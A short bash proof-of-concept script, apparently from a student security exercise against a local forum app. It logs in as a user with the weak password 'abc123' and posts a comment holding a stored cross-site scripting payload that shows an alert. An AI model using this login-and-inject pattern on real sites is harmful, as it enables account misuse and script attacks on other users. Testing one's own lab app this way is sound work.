#!/usr/bin/env bash

make_blue() {
  echo -e "\033[1;94m$1\033[1;0m"
}

make_green() {
  echo -e "\033[1;92m$1\033[1;0m"
}

funny_script='<script>alert("hello!")</script>'
domain="http://localhost:4942"
hacked_joe="jdoe@student.42.tech"
password="abc123"
forum_thread="/forum/6viy7xi64gxpan3"
forum_comment="/forum/6viy7xi64gxpan3/comment"

location=$(curl -X POST "$domain"/login \
    -s \
    -w "%{redirect_url}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "identity=$hacked_joe&password=$password" \
    -c cookie.txt);

if [[ $location == "$domain/" ]]; then 
    echo "$(make_green SUCCESS!) Logged in as joe.."
else
    echo "Were not able to login as joe...😔"
    exit 1
fi

location=$(curl -X POST "$domain$forum_comment" \
    -s \
    -w "%{redirect_url}" \
    -d "content=$funny_script" \
    -b cookie.txt);
echo $location
if [[ $location == "$domain$forum_thread" ]]; then 
    echo "Comment left $(make_green SUCCESSFULLY!!!)"
else 
    echo "Failure."
fi
